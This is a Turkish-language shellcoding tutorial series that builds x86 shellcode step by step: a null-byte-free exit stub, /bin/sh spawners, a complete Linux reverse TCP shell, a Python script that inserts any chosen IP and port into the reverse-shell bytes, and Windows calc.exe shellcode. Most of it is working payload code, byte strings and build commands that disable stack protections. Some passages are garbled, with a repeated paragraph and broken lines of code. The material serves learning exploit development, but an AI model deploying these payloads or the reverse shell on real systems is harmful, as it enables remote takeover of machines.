; ld -m elf_i386 -o example1 example1.o && ./example1
; 32-bit linux
section .data
section .bss
section .text
global _start ; must be declared for linker
; normal exit
_start: 		; linker entry point
	xor eax, eax ; zero out eax
	mov al, 1 	; sys_exit system call (mov eax, 1)
		      	; with remove null bytes
	int 0x80 	; call sys_exit
Null byte (\x00) üretmemek için al ve XOR hilesine dikkat edin.
Bu yöntem, shellcode'da null byte oluşumunu önlemek için kullanılır.Byte kodu çıkartma:
nasm -f elf32 -o example1.o example1.asm
ld -m elf_i386 -o example1 example1.o
objdump -M intel -d example1
İşte hexadecimal olarak nasıl göründüğü:  
Kullanmamız gereken byte kodları: **31 c0 b0 01 cd 80**. Kodun üst kısmını (run.c) aşağıdaki şekilde değiştirin:

/*
run.c - shellcode çalıştırmak için küçük bir iskelet program
*/

// bytecode burada
char code[] = "\x31\xc0\xb0\x01\xcd\x80";

int main(int argc, char **argv) {
    int (*func)(); // fonksiyon işaretçisi
    func = (int (*)()) code; // func, shellcode'u işaret ediyor
    (int)(*func)(); // code[] fonksiyonunu çalıştır

    // eğer program 1 yerine 0 dönerse,
    // shellcode'umuz başarılı çalıştı demektir
    return 1;
}

Derleyin ve çalıştırın:
 gcc -z execstack -m32 -o run run.c
   ./run
   echo $?
-z execstack bayrağı, yığını yürütülebilir hale getirerek NX (No-eXecute) korumasını devre dışı bırakır. Bu, shellcode'un programın yığında çalıştırılmasını sağlar. Programımız 1 yerine 0 döndürdü, bu da shellcode'un başarıyla çalıştığını gösteriyor.
Örnek 2: Linux Shell Başlatma
Basit bir shell başlatan bir shellcode yazalım (example2.asm):
; example2.asm - spawn a linux shell.
; author @cocomelonc
; nasm -f elf32 -o example2.o example2.asm
; ld -m elf_i386 -o example2 example2.o && ./example2
; 32-bit linux
section .data
msg: db '/bin/sh'
section .bss
section .text
global _start ; must be declared for linker
_start: ; linker entry point
; xoring anything with itself clears itself:
xor eax, eax ; zero out eax
xor ebx, ebx ; zero out ebx
xor ecx, ecx ; zero out ecx
xor edx, edx ; zero out edx
mov al, 0xb ; mov eax, 11: execve
mov ebx, msg ; load the string pointer to ebx
int 0x80 ; syscall
; normal exit
mov al, 1 ; sys_exit system call
; (mov eax, 1) with remove
; null bytes
xor ebx, ebx ; no errors (mov ebx, 0)
int 0x80 ; call sys_exit
Bu kodu derlemek için bu komutları kullanacağız:
nasm -f elf32 -0 example2.o example2.asm
ld -m elf_i386 -o example2 example2.o
./example2
Gördüğünüz gibi, programımız execve sistem çağrısını kullanarak bir shell başlattı.
Not:Evet, system("/bin/sh") kullanımı çok daha basit olurdu, değil mi? Ancak, bu yöntem her zaman ayrıcalıkları (privileges) düşürür.execve sistem çağrısı 3 argüman alır:EBX: Çalıştırılacak programın yolu.ECX: Argümanlar veya argv (null olabilir).EDX: Ortam değişkenleri veya envp (null olabilir). Bu sefer, null byte üretmeden, değişkenleri yığında saklayarak kod yazacağız (example3.asm):
; run /bin/sh and normal exit
; author @cocomelonc
; nasm -f elf32 -o example3.o example3.asm
; ld -m elf_i386 -o example3 example3.o && ./example3
; 32-bit linux

section .bss
section .text
global _start ; must be declared for linker
_start: ; linker entry point

; xoring anything with itself clears itself:
xor eax, eax       ; zero out eax
xor ebx, ebx       ; zero out ebx
xor ecx, ecx       ; zero out ecx
xor edx, edx       ; zero out edx

push eax           ; string terminator
push 0x68732f6e    ; "hs/n"
push 0x69622f2f    ; "ib//"
mov ebx, esp       ; "//bin/sh",0 pointer is ESP
mov al, 0xb        ; mov eax, 11: execve
int 0x80           ; syscall
Aşağıdaki adımları izleyerek kodun düzgün çalışıp çalışmadığını ve null byte içerip içermediğini kontrol edebilirsiniz:
nasm -f elf32 -o example3.o example3.asm
ld -m elf_i386 -o example3 example3.o
./example3
Objdump -M intel -d example3
Sonra,bash ve objdump kullanarak shellcode'un byte kodlarını çıkartabilirsiniz:
objdump -d ./example3 | grep '[0-9a-f]:' | grep -v 'file' | \
cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | \
sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | \
sed 's/^/"/' | sed 's/$/"/g'
Bizim shellcode’ımız böyle olacak:
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80"
Sonra,yukarıdaki kodu(run.c) bunla değiştirelim:
/*
run.c - a small skeleton program to run shellcode
*/

// bytecode here
char code[] = "\x31\xc0\x31\xdb\x31\xc9\x31"
              "\xd2\x50\x68\x6e\x2f\x73\x68\x68"
              "\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80";

int main(int argc, char **argv) {
    int (*func)(); // function pointer
    func = (int (*)()) code; // func points to our shellcode
    (int)(*func)(); // execute a function code[]
    // if our program returned 0 instead of 1,
    // so our shellcode worked
    return 1;
}
Derleyelim ve çalıştıralım:
gcc -z exestack -m32 -o run run.c
./run
Gördüğünüz gibi, her şey mükemmel çalışıyor. Artık bu shellcode'u kullanabilir ve bir sürece enjekte edebilirsiniz.  Sonraki bölümde, bir reverse TCP shellcode oluşturacağım. 
The Shellcoder’s Handbook(https://www.wiley.com/en-us/The+Shellcoder%27s+Handbook%3A+Discovering+and+Exploiting+Security+Holes%2C+2nd+Edition-p-9780470080238)
Shellcoding in Linux by exploit-db(https://www.exploit-db.com/docs/english/21013-shellcoding-in-linux.pdf)
my intro to x86 assembly(https://cocomelonc.github.io/tutorial/2021/10/03/malware-analysis-1.html)
my nasm tutorial(https://cocomelonc.github.io/tutorial/2021/10/08/malware-analysis-2.html)
execve(https://man7.org/linux/man-pages/man2/execve.2.html)
Git hub’taki kaynak kod: https://github.com/cocomelonc/2021-10-09-linux-shellcoding-1
9.Linux shellcoding.Reverse TCP shell kodu:
Bismillah
Önceki bölümde, standart bir shell başlatan bir shellcode yazmıştık. Bu bölümde, Reverse TCP Shellcode yazmayı hedefleyeceğiz.
Shell kodu kontrol edelim
/*
run.c - a small skeleton program to run shellcode
*/
// bytecode here
char code[] = "my shellcode here";
int main(int argc, char **argv) {
	int (*func)(); // function pointer
	func = (int (*)()) code; // func points to our shellcode
	(int)(*func)(); // execute a function code[]
	// if our program returned 0 instead of 1,
	// so our shellcode worked
return 1;
}
Reverse TCP shell’i
Daha önceki gönderilerden birindeki C kodunu temel alarak reverse TCP shell başlatan bir shellcode oluşturabiliriz.
/*
shell.c - reverse TCP shell
author: @cocomelonc
demo shell for linux shellcoding example*/

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
int main () {
	// attacker IP address
	const char* ip = "127.0.0.1";
	// address struct
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	inet_aton(ip, &addr.sin_addr);
	// socket syscall
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	// connect syscall
	connect(sockfd, (struct sockadr *)&addr, sizeof(addr));
	for (int i = 0; i < 3; i++) {
		// dup2(sockftd, 0) – stdin
		// dup2(sockfd, 1) - stdout
		// dup2(sockfd, 2) - stderr
		dup2(sockfd, i);
	}
	// execve syscall
	execve("/bin/sh", NULL, NULL);
	return 0;
}
Assembly Hazırlığı 
C kaynak kodunda gösterildiği gibi, aşağıdaki çağrıları Assembly diline çevirmek gerekiyor:

- Bir socket oluşturun.  
- Belirtilen bir IP ve port’a bağlanın.  
- Ardından, stdin, stdout, stderr'i dup2 ile yönlendirin.  
- execve ile bir shell başlatın.  
Socket oluşturalım
Socket işlemleri için, SYS_SOCKETCALL (sistem çağrısı 0x66) kullanılır:
Ardından, EAX kaydını temizleyin:
; int socketcall(int call, unsigned long *args);
push 0x66 	; sys_socketcall 102
pop eax 	; zero out eax
Bir sonraki önemli kısım, **socketcall** sistem çağrısının farklı fonksiyon çağrılarıdır. Bu çağrılar **/usr/include/linux/net.h** dosyasında bulunabilir:
Bu nedenle, önce SYS_SOCKET (0x1) ile başlamanız gerekiyor. Ardından, EBX kaydını temizleyin:
push 0x1 	; sys_socket 0x1
pop ebx 	; zero out ebx
socket() çağrısı temelde 3 argüman alır ve bir socket dosya tanıtıcısı döndürür:  
sockfd = socket(int socket_family, int socket_type, int protocol);
Bu nedenle, argümanların tanımlarını bulmak için farklı başlık dosyalarını kontrol etmeniz gerekir. Protocol için:  
nvim /usr/include/linux/in.h
socket_type için:
nvim /usr/include/bits/socket_type.h
socket_family için:
nvim /usr/include/bits/socket.h
Bu bilgilere dayanarak, edx kaydını temizledikten sonra farklı argümanları (socket_family, socket_type, protocol) yığına itebilirsiniz:
xor edx, edx 	; zero out edx
; int socket(int domain, int type, int protocol);
push edx 	; protocol = IPPROTO_IP (0x0)
push ebx 	; socket_type = SOCK_STREAM (0x1)
push 0x2 	; socket_family = AF_INET (0x2)
Ve ecx bu yapıya bir işaretçi tutması gerektiğinden, esp'nin bir kopyası alınmalıdır:
mov ecx, esp 	; move stack pointer to ecx
En son syscall çalıştıralım:
int 0x80 	; syscall (exec sys_socket)
Bu işlem, EAX kaydına bir socket dosya tanıtıcısı döndürür.Sonuç olarak:
xchg edx, eax 	; save result (sockfd) for later usage
Belirli Bir IP ve Porta Bağlanma
Öncelikle, yeniden standart socketcall sistem çağrısını al kaydına yüklemeniz gerekiyor:
; int socketcall(int call, unsigned long *args);
mov al, 0x66 	; socketcall 102
connect() fonksiyonunun argümanlarını inceleyelim. En ilginç argümanlardan biri, sockaddr yapısıdır:
struct sockaddr_in {
	__kernel_sa_family_t sin_family; /* Address family */
	__be16 sin_port; /* Port number */
	struct in_addr sin_addr; /* Internet address */
};
Bu noktada argümanları yerleştirmeniz gerekiyor. Önce sin_addr, ardından sin_port ve son olarak sin_family(unutmayın: ters sıra ile!):
; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
push 0x0101017f 		; sin_addr = 127.1.1.1 (network byte order)
push word 0x5c11 	; sin_port = 4444
Bu noktada ebx, socket() çağrısı sırasında socket_type'ı yerleştirdiğiniz için 0x1 değerini içerir. ebx'i artırdıktan sonra ebx, sin_family argümanı için 0x2 değerine sahip olmalıdır:
inc ebx 		; ebx = 0x02
push word bx 	     ; sin_family = AF_INET
Ardından, bu sockaddr yapısına işaret eden yığın işaretçisini (stack pointer) ecx kaydına kaydedin:
mov ecx, esp 	; move stack pointer to sockaddr struct
Sonra:
push 0x10 		; addrlen = 16
push ecx 		; const struct sockaddr *addr
push edx 		; sockfd
mov ecx, esp 	; move stack pointer to ecx (sockaddr_in struct)
inc ebx 		; sys_connect (0x3)
int 0x80 	     ; syscall (exec sys_connect)
stdin, stdout ve stderr'i dup2 ile yönlendirme
Bir döngü başlatmak için sayaç ayarlayın ve ecx'i sıfırlayın:
push 0x2 		; set counter to 2
pop ecx 	     ; zero to ecx (reset for newfd loop)
ecx döngü için hazır. Şimdi, dup2 sistem çağrısı sırasında ihtiyaç duyduğunuz socket dosya tanıtıcısını ebx kaydına kaydedin:
xchg ebx, edx 		; save sockfd
Sonra,dup2 2 tane argüman alır:
int dup2(int oldfd, int newfd);
oldfd (ebx) istemci socket dosya tanıtıcısını (client socket file descriptor) temsil eder.
newfd, sırasıyla stdin (0), stdout (1) ve stderr (2) için kullanılır:
for (int i = 0; i < 3; i++) {
	// dup2(sockftd, 0) - stdin
	// dup2(sockfd, 1) - stdout
	// dup2(sockfd, 2) - stderr
	dup2(sockfd, i);
}	
Evet, sys_dup2 sistem çağrısı, ecx tabanlı bir döngüde üç kez çalıştırılır:
dup:
	mov al, 0x3f 		; sys_dup2 = 63 = 0x3f
	int 0x80 		; syscall (exec sys_dup2)
	dec ecx 		; decrement counter
	jns dup		; as long as SF is not set -> jmp to dup
jns komutu, işaret (signed) bayrağı (SF) ayarlanmadığı sürece "dup" etiketine atlar.Şimdi GDB ile kodu adım adım hata ayıklayıp, ecx değerini kontrol edelim:
gdb -q ./rev
Gördüğünüz gibi, üçüncü desteden sonra ecx -1'e eşit olan 0xffffffff'i içeriyor ve SF ayarlandı ve kabuk kodu akışı devam ediyor.Sonuç olarak, üç çıktının tümü yeniden yönlendirilir :)
execve ile kabuğu başlat
Kodun bu kısmı ilk kısımdaki örneğe benzer ancak yine küçük bir değişimleexecve ile kabuğu başlat
Kodun bu kısmı ilk kısımdaki örneğe benzer ancak yine küçük değişimle:
; spawn /bin/sh using execve
; int execve(const char *filename,
; char *const argv[],char *const envp[]);
mov al, 0x0b 	; syscall: sys_execve = 11 (mov eax, 11)
inc ecx 		; argv=0
mov edx, ecx 	; envp=0
push edx 		; terminating NULL
push 0x68732f2f 	; "hs//"
push 0x6e69622f 	; "nib/"
mov ebx, esp 	; save pointer to filename
int 0x80 		; syscall: exec sys_execve

Gördüğünüz gibi, /bin//sh dizgisi için sonlandırıcı NULL'u ayrı olarak yığına itmemiz gerekiyor, çünkü kullanabileceğimiz bir NULL zaten mevcut değil. Böylece işimiz bitmiş oluyor.
Son Tam Kabuk Kodu
Tam, yorumlanmış kabuk kodum:
; run reverse TCP /bin/sh and normal exit
; author @cocomelonc
; nasm -f elf32 -o rev.o rev.asm
; ld -m elf_i386 -o rev rev.o && ./rev
; 32-bit linux
section .bss
section .text
	global _start ; must be declared for linker
_start: 		; linker entry point
	; create socket
	; int socketcall(int call, unsigned long *args);
	push 0x66 ; sys_socketcall 102
	pop eax ; zero out eax
	push 0x1 ; sys_socket 0x1
	pop ebx ; zero out ebx
	xor edx, edx ; zero out edx
	  ; int socket(int domain, int type, int protocol);
	push edx ; protocol = IPPROTO_IP (0x0)
	push ebx ; socket_type = SOCK_STREAM (0x1)
	push 0x2 ; socket_family = AF_INET (0x2)
	mov ecx, esp ; move stack pointer to ecx
	int 0x80 ; syscall (exec sys_socket)
	xchg edx, eax ; save result (sockfd) for later usage

   	  ; int socketcall(int call, unsigned long *args);
	mov al, 0x66 ; socketcall 102

	  ; int connect(int sockfd, const struct sockaddr *addr,
	  ; socklen_t addrlen);
	push 0x0101017f ; sin_addr = 127.1.1.1
			       ; (network byte order)
	push word 0x5c11 ; sin_port = 4444
	inc ebx ; ebx = 0x02
	push word bx ; sin_family = AF_INET
	mov ecx, esp ; move stack pointer to sockaddr struct

	push 0x10 ; addrlen = 16
	push ecx ; const struct sockaddr *addr
	push edx ; sockfd
	mov ecx, esp 	; move stack pointer to ecx (sockaddr_in struct)
	inc ebx 		; sys_connect (0x3)
	int 0x80 		; syscall (exec sys_connect)
	; int socketcall(int call, unsigned long *args);
	; duplicate the file descriptor for
	; the socket into stdin, stdout, and stderr
	; dup2(sockfd, i); i = 1, 2, 3
	push 0x2 ; set counter to 2
	pop ecx ; zero to ecx (reset for newfd loop)
	xchg ebx, edx ; save sockfd
dup:
	mov al, 0x3f ; sys_dup2 = 63 = 0x3f
	int 0x80 ; syscall (exec sys_dup2)
	dec ecx ; decrement counter
	jns dup ; as long as SF is not set -> jmp to dup
	; spawn /bin/sh using execve
	; int execve(const char *filename, char
	; *const argv[],char *const envp[]);
	mov al, 0x0b ; syscall: sys_execve = 11 (mov eax, 11)
	inc ecx ; argv=0
	mov edx, ecx ; envp=0
	push edx ; terminating NULL
	push 0x68732f2f ; "hs//”
	push 0x6e69622f ; "nib/"
	mov ebx, esp ; save pointer to filename
	int 0x80 ; syscall: exec sys_execve

Test etmek
Şimdi, ilk bölümde olduğu gibi, bunu derleyelim ve doğru çalışıp çalışmadığını ve null baytlar içerip içermediğini kontrol edelim:
nasm -f elf32 -o rev.o rev.asm
ld -m elf_i386 -o rev rev.o
objdump -M intel -d rev



4444 port’unda dinleyiciyi hazırlayıp çalıştıralım:
./rev

Mükemmel!

Daha sonra, biraz bash ile kodlama ve objdump kullanarak bayt kodunu çıkartalım:
objdump -d ./rev|grep '[0-9a-f]:'|grep -v 'file'|cut -f2
-d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|
sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'



Böylece bizim kabuk kodumuz(shellcode):
"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1
\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x11\x5c
\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80
\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b
\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
\x89\xe3\xcd\x80"

Sonra,yukarıdaki kodu(run.c) bununla değiştirelim:
/*
run.c - a small skeleton program to run shellcode
*/
// bytecode here
char code[] =
"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89"
"\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68"
"\x11\x5c\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1"
"\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49"
"\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68"
"\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
int main(int argc, char **argv) {
	int (*func)(); // function pointer
	func = (int (*)()) code; // func points to our shellcode
	(int)(*func)(); // execute a function code[]
	// if our program returned 0 instead of 1,
	// so our shellcode worked
	return 1;
}
Derleyelim,dinleyiciyi hazırlayalım ve çalıştıralım:
gcc -z execstack -m32 -o run run.c
./run
Gördüğünüz gibi, her şey mükemmel bir şekilde çalışıyor. Artık bu kabuk kodunu kullanabilir ve bir sürece enjekte edebilirsiniz. Ancak bir sorun var. Şimdi IP ve portu kolayca yapılandırılabilir hale getirelim.

Yapılandırılabilir IP ve Port

Bu sorunu çözmek için basit bir Python betiği (super_shellcode.py) oluşturdum:

import socket
import argparse
import sys

BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
ENDC = '\033[0m'

def my_super_shellcode(host, port):
	print (BLUE)
	print ("let's go to create your super shellcode...")
	print (ENDC)
	if int(port) < 1 and int(port) > 65535:
		print (RED + "port number must be in 1-65535" + ENDC)
		sys.exit()
	if int(port) >= 1 and int(port) < 1024:
		print (YELLOW + "you must be a root" + ENDC)
	if len(host.split(".")) != 4:
		print (RED + "invalid host address :(" + ENDC)
		sys.exit()

	h = socket.inet_aton(host).hex()
	hl = [h[i:i+2] for i in range(0, len(h), 2)]
	if "00" in hl:
		print (YELLOW)
		print ("host address will cause null bytes \
		to be in shellcode :(")
		print (ENDC)
	h1, h2, h3, h4 = hl

	shellcode_host = "\\x" + h1 + "\\x" + h2
	shellcode_host += "\\x" + h3 + "\\x" + h4
	print (YELLOW)
	print ("hex host address:")
	print (" x" + h1 + "x" + h2 + "x" + h3 + "x" + h4)
	print (ENDC)

	p = socket.inet_aton(port).hex()[4:]
	pl = [p[i:i+2] for i in range(0, len(p), 2)]
	if "00" in pl:
		print (YELLOW)
		print ("port will cause null bytes \
		to be in shellcode :(")
		print (ENDC)
	p1, p2 = pl

	shellcode_port = "\\x" + p1 + "\\x" + p2
	print (YELLOW)
	print ("hex port: x" + p1 + "x" + p2)
	print (ENDC)

	shellcode = "\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x31"
	shellcode += "\\xd2\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd"
	shellcode += "\\x80\\x92\\xb0\\x66\\x68"
	shellcode += shellcode_host
	shellcode += "\\x66\\x68"
	shellcode += shellcode_port
	shellcode += "\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10"
	shellcode += "\\x51\\x52\\x89\\xe1\\x43\\xcd"
	shellcode += "\\x80\\x6a\\x02\\x59\\x87\\xda\\xb0"
	shellcode += "\\x3f\\xcd\\x80\\x49\\x79\\xf9"
	shellcode += "\\xb0\\x0b\\x41\\x89\\xca\\x52\\x68"
	shellcode += "\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69"
	shellcode += \\x6e\\x89\\xe3\\xcd\\x80

	print (GREEN + "your super shellcode is:" + ENDC)
	print (GREEN + shellcode + ENDC)
if __name__ == "__main__":

	parser = argparse.ArgumentParser()
	parser.add_argument('-l','--lhost',
		required = True, help = "local IP",
		default = "127.1.1.1", type = str)
	parser.add_argument('-p','--lport',
		required = True, help = "local port",
		default = "4444", type = str)
	args = vars(parser.parse_args())
	host, port = args['lhost'], args['lport']
	my_super_shellcode(host, port)

Dinleyiciyi hazırlayın, betiği çalıştırın, kabuk kodunu test programımıza kopyalayın, derleyin ve çalıştırın:
python3 super_shellcode.py -l 10.9.1.6 -p 4444
gcc -static -fno-stack-protector -z execstack -m32 -o run run.c



Yani, kabuk kodumuz mükemmel bir şekilde çalıştı :) İşte bu, örneğin kendi kabuk kodunuzu nasıl oluşturacağınızı gösteriyor.
The Shellcoder’s Handbook(https://www.wiley.com/en-us/The+Shellcoder%27s+Handbook%3A+Discovering+and+Exploiting+Security+Holes%2C+2nd+Edition-p-9780470080238)
Shellcoding in Linux by exploit-db(https://www.exploit-db.com/docs/english/21013-shellcoding-in-linux.pdf)
my intro to x86 assembly(https://cocomelonc.github.io/tutorial/2021/10/03/malware-analysis-1.html)
my nasm tutorial(https://cocomelonc.github.io/tutorial/2021/10/08/malware-analysis-2.html)
ip(https://man7.org/linux/man-pages/man7/ip.7.html)
socket(https://man7.org/linux/man-pages/man2/socket.2.html)
connect(https://man7.org/linux/man-pages/man2/connect.2.html)
execve(https://man7.org/linux/man-pages/man2/execve.2.html)
first part(https://cocomelonc.github.io/tutorial/2021/10/09/linux-shellcoding-1.html)
Github’taki kaynak kod: https://github.com/cocomelonc/2021-10-17-linux-shellcoding-2

10. Windows Shellcoding - Bölüm 1. Basit Bir Örnek
Bismillah
Kabuk kodu hakkında önceki bölümlerde, Linux örnekleriyle çalıştık. Bu bölümdeki amacım, Windows makinesi için kabuk kodu yazmak olacak.
Kabuk Kodunu Test Etme
Kabuk kodunu test ederken, onu bir programa yerleştirip çalıştırmak oldukça kullanışlıdır. İlk yazıda kullandığımız aynı kodu kullanacağız (run.c):
/*
run.c - a small skeleton program to run shellcode
*/
// bytecode here
char code[] = "my shellcode here";
int main(int argc, char **argv) {
	int (*func)(); // function pointer
	func = (int (*)()) code; // func points to our shellcode
	(int)(*func)(); // execute a function code[]
	// if our program returned 0 instead of 1,
	// so our shellcode worked
	return 1;
}
İlk örnek.calc.exe’yi çalıştır
Öncelikle, kabuk kodunun bir prototipini C dilinde yazacağız. Basitlik açısından, aşağıdaki kaynak kodunu yazalım (exit.c):
/*
exit.c - run calc.exe and exit
*/
#include <windows.h>
int main(void) {
	WinExec("calc.exe", 0);
	ExitProcess(0);
}
Gördüğünüz gibi, bu programın mantığı basit: hesap makinesini (calc.exe) başlat ve çık. Kodumuzun gerçekten çalıştığından emin olalım. Derleyelim:
i686-w64-mingw32-gcc -o exit.exe exit.c -mconsole -lkernel32
Sonra Windows makinesinde çalıştır(Windows 7 x86 SP1):
./exit.exe
Her şey mükemmel bir şekilde çalıştı. 
Şimdi bu mantığı assembly dilinde yazmayı deneyelim. Windows çekirdeği, Linux çekirdeğinden tamamen farklıdır. Programımızın başında #include <windows.h> ifadesi yer alıyor, bu da Windows kütüphanesinin koda dahil edileceği ve bağımlılıkların varsayılan olarak dinamik bir şekilde bağlanacağı anlamına gelir. Ancak, aynı şeyi ASM ile yapamayız. ASM'de, WinExec işlevinin konumunu bulmamız, argümanları yığına yüklememiz ve işlevin işaretçisine sahip olan kaydı çağırmamız gerekir. ExitProcess işlevi için de aynı şey geçerlidir.Çoğu Windows işlevinin üç ana kütüphanede bulunduğunu bilmek önemlidir: ntdll.dll, Kernel32.DLL ve KernelBase.dll. Örneğimizi bir hata ayıklayıcıda (benim durumumda x32dbg) çalıştırırsanız, bunu doğrulayabilirsiniz:
Fonksiyonun adresini bulma
Yani, bellekteki WinExec adresini bilmemiz gerekiyor. Haydi bulalım!
/*
getaddr.c - get addresses of functions
(ExitProcess, WinExec) in memory
*/
#include <windows.h>
#include <stdio.h>
int main() {
	unsigned long Kernel32Addr; // kernel32.dll address
	unsigned long ExitProcessAddr; // ExitProcess address
	unsigned long WinExecAddr; // WinExec address

	Kernel32Addr = GetModuleHandle("kernel32.dll");
	printf("KERNEL32 address in memory: 0x%08p\n", Kernel32Addr);

	ExitProcessAddr = GetProcAddress(Kernel32Addr, "ExitProcess");
	printf("ExitProcess address in memory is: 0x%08p\n", ExitProcessAddr);

	WinExecAddr = GetProcAddress(Kernel32Addr, "WinExec");
	74printf("WinExec address in memory is: 0x%08p\n", WinExecAddr);

	getchar();
	return 0;
}
Bu program size çekirdek adresini ve kernel32.dll içindeki WinExec adresini söyleyecek. Şimdi bunu derleyelim:
i686-w64-mingw32-gcc -O2 getaddr.c -o getaddr.exe \
-mconsole -I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wall \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc >/dev/null 2>&1
ve bizim hedef makinemizde çalıştıralım:
./getaddr.exe
Artık işlevlerimizin adreslerini biliyoruz. Programımızın kernel32 adresini doğru bir şekilde bulduğuna dikkat edin.
Assembly Zamanı
"Kernel32.dll içindeki WinExec() işlevi, süreci çalıştıran kullanıcının erişebileceği herhangi bir programı başlatmak için kullanılabilir:
UINT WinExec(LPCSTR lpCmdLine, UINT uCmdShow);
Bizim durumumuzda, lpCmdLine calc.exe'ye, uCmdShow ise 1'e (SW_NORMAL) eşit olacak.Öncelikle, calc.exe'yi bir Python betiği (conv.py) aracılığıyla hex'e dönüştürelim:
# convert string to reversed hex
import sys
input = sys.argv[1]
chunks = [input[i:i+4] for i in range(0, len(input), 4)]
for chunk in chunks[::-1]:
	print (chunk[::-1].encode("utf-8").hex())


Şimdi bizim assembly kodumuzu oluşturalım:
xor ecx, ecx ; zero out ecx
push ecx       ; string terminator 0x00 for
		; "calc.exe" string
push 0x6578652e ; exe. : 6578652e
push 0x636c6163 ; clac : 636c6163

mov eax, esp ; save pointer to "calc.exe"
		 ; string in ebx

; UINT WinExec([in] LPCSTR lpCmdLine, [in] UINT uCmdShow);
inc ecx 	; uCmdShow = 1
push ecx 	; uCmdShow *ptr to stack in
		; 2nd position - LIFO
push eax 	; lpcmdLine *ptr to stack in
		; 1st position
mov ebx, 0x76f0e5fd ; call WinExec() function
			    ; addr in kernel32.dll

call ebx
Bir şeyi Little Endian formatına koymak için, baytların hex değerlerini ters çevirerek yazmanız yeterlidir.Peki ya ExitProcess işlevi?
void ExitProcess(UINT uExitCode);
Bu işlev, WinExec işlevi kullanılarak calc.exe süreci başlatıldıktan sonra ana süreci düzgün bir şekilde kapatmak için kullanılır:
; void ExitProcess([in] UINT uExitCode);
xor eax, eax 		    ; zero out eax
push eax 		    ; push NULL
mov eax, 0x76ed214f ; call ExitProcess
			    ; function addr in kernel32.dll
jmp eax 		    ; execute the ExitProcess function
Final kodumuz:
; run calc.exe and normal exit
; author @cocomelonc
; nasm -f elf32 -o example1.o example1.asm
; ld -m elf_i386 -o example1 example1.o
; 32-bit linux (work in windows as shellcode)

section .data

section .bss

section .text
	global _start ; must be declared for linker
_start:
	xor ecx, ecx ; zero out ecx
	push ecx ; string terminator 0x00
			; for "calc.exe" string
	push 0x6578652e ; exe. : 6578652e
	push 0x636c6163 ; clac : 636c6163
	mov eax, esp ; save pointer to "calc.exe"
			; string in ebx
	; UINT WinExec([in] LPCSTR lpCmdLine, [in] UINT uCmdShow);
	inc ecx ; uCmdShow = 1
	push ecx ; uCmdShow *ptr to stack in
			; 2nd position - LIFO
	push eax ; lpcmdLine *ptr to stack in
			; 1st position
	mov ebx, 0x76f0e5fd ; call WinExec() function
			; addr in kernel32.dll
	call ebx
			; void ExitProcess([in] UINT uExitCode);
	xor eax, eax ; zero out eax
	push eax ; push NULL
	mov eax, 0x76ed214f ; call ExitProcess function
				; addr in kernel32.dll
	jmp eax 		; execute the ExitProcess function
Derleyelim:
nasm -f elf32 -o example1.o example1.asm
ld -m elf_i386 -o example1 example1.o
objdump -M intel -d example1




O zaman, tekrar bash ile biraz kodlama yaparak ve objdump kullanarak bayt kodunu çıkaralım:
objdump -M intel -d example1 | grep '[0-9a-f]:'|grep -v
'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|
sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|
sed 's/$/"/g'


Bizim byte kodumuz:
"\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c
\x63\x89\xe0\x41\x51\x50\xbb\xfd\xe5\xf0\x76\xff
\xd3\x31\xc0\x50\xb8\x4f\x21\xed\x76\xff\xe0"


Yalnızca opkodları bizim için çevirmesi amacıyla nasm kullandığımız için, ELF dosyası olarak 32-bit Linux için derlenmiştir.Daha sonra, yukarıdaki kodu (run.c) şu kod ile değiştirin:/*
run.c - a small skeleton program to run shellcode
*/
// bytecode here
char code[] =
"\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61""\x6c\x63\x89\xe0\x41\x51\x50\xbb\xfd\xe5\xf0"
"\x76\xff\xd3\x31\xc0\x50\xb8\x4f\x21\xed\x76"
"\xff\xe0";
int main(int argc, char **argv) {
	int (*func)(); // function pointer
	func = (int (*)()) code; // func points to our shellcode
	(int)(*func)(); // execute a function code[]
	// if our program returned 0 instead of 1,
	// so our shellcode worked
	return 1;
}




Çalıştır:
 i686-w64-mingw32-gcc run.c -o run.exe

ve çalıştıralım:
./run.exe
++++++++++++++++++
